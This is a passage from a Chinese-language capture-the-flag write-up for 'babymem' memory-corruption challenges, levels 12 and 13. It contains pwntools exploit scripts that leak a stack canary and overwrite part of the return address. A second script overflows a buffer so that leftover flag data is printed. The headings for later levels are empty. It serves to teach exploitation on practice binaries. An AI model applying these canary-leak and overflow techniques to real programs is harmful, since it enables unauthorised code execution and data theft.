match = re.search(r'^(You said: REPEATA+.*?)$', output.decode('latin-1'), re.MULTILINE)
if match:
    line = match.group(1)
    cancary =  line.encode('latin-1')[0x68 + 1 + 10 : 0x68 + 1 + 7 + 10]
    hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
    cancary_value = p64(int(hex_str, 16))
    print(cancary_value)
else:
    print("No matching line found")

buffer_size = 0x68 + 8 + 8 + 2
p.sendline(f"{buffer_size}")
p.send(b'A'* 0x68 + cancary_value + b'A' * 8 + b'\x6A' + b'\x1B')
p.interactive()
exit()



elf = ELF("/home/hacker/memory/level12/babymem_level12.0")
p = process("/home/hacker/memory/level12/babymem_level12.0")
buffer_size = 0x78 + 1
p.sendline(f"{buffer_size}")
p.send(b'REPEAT' +  b'A' * (0x78 - 6 + 1))
output = p.recvuntil(b'Backdoor triggered! Repeating challenge()')

match = re.search(r'^(You said: REPEATA+.*?)$', output.decode('latin-1'), re.MULTILINE)
if match:
    line = match.group(1)
    cancary =  line.encode('latin-1')[0x78 + 1 + 10 : 0x78+1+7 + 10]
    hex_str = ''.join(f'{byte:02x}' for byte in cancary[::-1]) + "00"
    cancary_value = p64(int(hex_str, 16))
else:
    print("No matching line found")

buffer_size = 0x78 + 8 + 8 + 2
p.sendline(f"{buffer_size}")
p.send(b'A'* 0x78 + cancary_value + b'A' * 8 + b'\x37' + b'\x24')
p.interactive()
exit()

```



## level 13

这一关在challenge之前，有一个verfiy函数，他会读取flag的内容到栈空间中。 在调用verfiy函数返回后才调用challenge函数，又碰巧challenge函数的栈空间大于verfiy的栈空间。所以challenge函数的栈空间中包含有verfiy的栈空间。也就是包含了verfiy之前读取到的flag内容。

又又又恰巧，读取标准输入缓冲区的buffer恰好在verfiy读取flag的内容之前，所以，只要恰好将缓冲区溢出到flag的位置，后续`puts`函数就会将flag的内容打印出来。

至于如何计算溢出的字节数，就反编译看一下栈空间，计算一下buffer到flag的字节数就行。


```python
from pwn import *

elf = ELF("/challenge/babymem_level13.1")
p = process("/challenge/babymem_level13.1")

buffer_size = 0x1B
p.sendline(f"{buffer_size}")
p.send(buffer_size * b'A')
p.interactive()

elf = ELF("/challenge/babymem_level13.0")
p = process("/challenge/babymem_level13.0")

buffer_size = 0x37
p.sendline(f"{buffer_size}")
p.send(buffer_size * b'A')
p.interactive()
```


## level 14

## level 15